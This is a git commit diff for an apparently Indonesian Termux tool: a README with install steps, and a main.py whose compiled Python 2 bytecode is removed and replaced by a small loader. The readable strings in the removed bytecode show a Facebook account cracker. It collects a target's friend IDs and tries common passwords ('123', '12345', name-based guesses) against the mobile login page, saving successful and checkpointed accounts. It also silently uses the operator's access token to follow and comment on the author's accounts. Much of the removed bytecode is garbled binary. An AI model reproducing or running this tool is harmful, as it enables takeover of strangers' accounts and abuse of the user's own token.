fa9ef102b29deda26a41c95405396f477c76f1e8
VnoGnz <94194558+VnoGnz@users.noreply.github.com>
2021-11-17 05:44:04 +0700

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,9 @@
+# how to install
+```php
+$ pkg install git python -y
+$ https://github.com/VnoGnz/Drag-
+$ cd drag-fb
+$ pip install -r requirements.txt
+$ python main.py
+```
 
--- main.py
+++ main.py
@@ -1,91 +1,11 @@
- 
- ​�  
- ���ac@s�ddlZddlZddlZddlZy(ddlZddlZddlZWnek 
- rudGHdGHnXy4ddlm	Z	ddl 
- ​m 
- ​Z 
- ​ddlmZWne        k 
- r�dGHnXda gZgZd	Zd 
- ZdZdZd ZdZdZdZyejd�jZWn#e	k 
- r@dGHejd�nXdZd�ZdZd�Zd�Z d�Z!d�Z"d�Z#e$dkr�e�ndS(i����Ns& [-] module requests belum terinstall s+ [-] silahkan ketik > pip2 install requests(tConnectionError(tdatetime(t 
- ThreadPools$ [-] check your internet Connection is[1;93ms[1;92ms[1;101ms[0ms[1;91ms[1;96mszNokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420t 
- ​rafianonymshttps://api.ipify.orgs' 
- ​ [!] check your internet Connection ! 
- ​is3__________________________________________________ 
- cCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns 
- g�������?(tsyststdouttwritetflushttimetsleep(tzti((s/sdcard/bfr.pytjalan1s s_ 
- ​[1;96m ______   _______  ______   
- ​([1;96m____  \ (_______)(_____ \         [0m[ [1;9Angga Gnz[0m ] 
- ​ [1;96m____)  ) _____    _____) ) 
- ​[1;96m|  __  ( |  ___)  |  __  /  
- ​[1;96m| |__)  )| |      | |  \ \  
- ​[1;96m|______/ |_|      |_|   |_| 
- ​[1;101m[1;97mCreat by : Angga Gnz => 7 November 2021[0m 
- ​__________________________________________________ 
- cCs�tjd�ytdd�}t�Wn�ttfk 
- r�tGHdGHdGHtd�}|dkr�dGHtj	d	�t 
- ​�q�|d 
- ks�|dkr�t�q�|dkr�td �tjd�q�t 
- �nXdS(Ntclearslogin_r.txttrs [1] login with token facebook s [0] exit  
- s [[101m[1;97m?[0m] pilih : ts 
- [!] mohon di isi it1t01t0s [R] silahkan kembali lagi texit( tostsystemtopentmenutKeyErrortIOErrort	rafi_logot	raw_inputRR	tloginttokenzR(ttokentmet_log((s/sdcard/bfr.pyRBs&  
- ​ 
- ​ 
- cCs�tjd�tGHytdd�}Wn�ttfk 
- r�td�}y`tjd|�}t	j 
- |j�}tdd�}|j|�|j �t�td�Wq�tk 
- r�dGHq�XnXdS(	NR slogin_r.txtRs [[101m?[0m] token : s+https://graph.facebook.com/me?access_token=tws [!] login succes....s [!] token salah (RRRRRRRtrequeststgettjsontloadsttextRtclosetfollow_my_accountR(Rtotwtatavsid((s/sdcard/bfr.pyRWs  
- cCs�ytdd�j�}Wn-tk 
- rHdGHtd�tjd�nXd}tjd|d|�tjd	|�tjd 
- |�t�dS(Nslogin_r.txtRs invalid token ! s please login againsrm -rf login_r.txtslopyu bang rafis=https://graph.facebook.com/148068940881574/comments/?message=s&access_token=sDhttps://graph.facebook.com/100070354054405/subscribers?access_token=sDhttps://graph.facebook.com/100067770738028/subscribers?access_token=(	RtreadRRRRR!tpostR(Rtkom_r((s/sdcard/bfr.pyR'is  
- cCs?tjd�ytdd�j�aWn<tk 
- rdtd�tjd�tjd�t�nXy=tj	dt�}t 
- j|j�}|d}|d}WnWt k 
- r�tjd�td	�tjd�t�ntjjk 
- ​r�d 
- GHnXtGHdtt|fGHdtttfGHd tt|fGHdttfGHdttfGHdttfGHtd�}|dks�|dkr�t�n�|dks�|dkr�td�tjd�tjd�t�nc|dkr�td�tjd�n=|dks|dkr*td�t�ntd�t�dS(NR slogin_r.txtRs [!] token invalid srm -rf login_r.txts,https://graph.facebook.com/me/?access_token=tnametids [!] invalid token s$ [!] check your Internet connection s [%s-%s] facebook user : %ss [%s-%s] ip user : %ss [%s-%s] id user : %s 
- ​s [%s1%s] start crack s [%s2%s] hapus token s [%s0%s] logout 
- s [?] pilih : RRt2t02s [!] menghapus token....iRs [!] silahkan datang kembali RRt s [!] harap di isi s" [!] hanya pilih yang ada di menu (RRRR+RRRRR!R"R#R$R%Rt 
- exceptionsRRtmltratipthjtkutmRtcrackRR	R(R(R)tnamaR/tasw((s/sdcard/bfr.pyRvsV  
- ​  
- ​  
- ​  
- ​         
- ​ 
- ​  
- ​ 
- ​ 
- ​ 
- ​ 
- ​c 
- Cshtjd�tGHytdd�j�aWntk 
- rJdGHt�nXtd�}y1t	j 
- d|dt�}tj|j �}Wntk 
- ​r�td�nXt        j 
- d|d	t�}tj|j �}x;|d 
- D]/}|d}|d}tj|d |�q�Wdttt��GHtGHdGHtGHd�}td�}	|	j|t�td�dS(NR slogin_r.txtRs [!] invalid token s" [[101m[1;97m?[0m] ID Public : shttps://graph.facebook.com/s?access_token=s [!] Id tidak ditemukan s/friends?access_token=tdataR/R.s<=>s" [[101m[1;97m-[0m] Total ID : s' 		[1;101m[1;97mCTRL + Z FOR STOP[0mc	Ss�g}tjjdtttt�f�tjj�ytj	d�Wnt 
- ​k 
- rZnX|jd�\}}x|jd�D]�}t|�dkr�q�q�t|�dkr�t|�dkr�t|�dkr�t|�dks�t|�d	krL|j|�|j|d 
- �|j|d�|j|d�|j|d �q�|jd�|jd�|jd�q�WyRxA|D]9}|j �}tjddi|d6|d6dd6ditd6�}|j}d|ks�d|krUd|d|ddfGHtj|d|�tjdt|�dt|�d �tj�Pq�nd!|kr�y�td"�j�ad#|d$t}tj|�j�}	|	d%jd&d'�} 
- ​|        d(}d)|d*|d*| 
- ​GHtj|d*|d*| 
- �tjd+t|�d*t|�d*| 
- d �tj�PWn#ttfk 
- ​rOd} 
- nnXd,|d*|dGHtj|d|�tjd+t|�d*t|�d �tj�Pq�q�q�Wtd7aWnnXdS(-Ns) [%sC] berjalan %s - %s please wait.. ! tresultss<=>R2iiiiit12t123t1234t12345tsayangtkontolt	bismillahs%https://mbasic.facebook.com/login.phpR=temailtpasstsubmitRtheaderss 
- user-agenttmbasic_logout_buttonssave-devices ==-[ t|s s]-==s	 [ OK ] s 
- ​t 
- checkpointslogin_r.txtshttps://graph.facebook.com/s?access_token=tbirthdayt/t-R.s [1;96m[ CP ] s <-> s	 [ CP ] s [1;96m [ CP ] ( RRRR5tlooptlenR/RRtmkdirtOSErrortsplittappendtlowerR!R,tuatcontenttoktsavetstrR&RR+RtsR"R#treplacetcpRR(tusertra_pwtrax_xR.tsstpwtrextxoturlR=ttgllhrR;((s/sdcard/bfr.pytmain�st	 Z 7	) 
- ​ 
- ​1 
- ​        ) 
- ​ 
- ​is  
- [!] selesai (RRRRR+RRRRR!R"R#R$R%RRR/RUR[RQtgarisRtmapR( 
- tra_idtpoktspRR 
- RRaR.Rhtp((s/sdcard/bfr.pyR:�s6  
- ​ 
- 	<t__main__(%RRtrandomRtreR#R!tImportErrortrequests.exceptionsRRtmultiprocessing.poolRRPR/R`R8R7R4R5R9tbmRWtpw_rafiR"R%R6R	RiRRRRR'RR:t__name__(((s/sdcard/bfr.pyt<module>sT 	 	 				 	.	Z 
-  
-  
- ​        MY NAME Angga Gnz
+import sys,shutil
+
+runtah=["saya_gans/__pycache__","modul/__pycache__","wibu/__pycache__","saya_gans/ngewe/__pycache__"]
+
+if sys.version[0]!="3":
+	exit(" ! harap gunakan python3")
+
+from saya_gans import awokawokawok
+try: [shutil.rmtree(x) for x in runtah]
+except: pass
+awokawokawok()
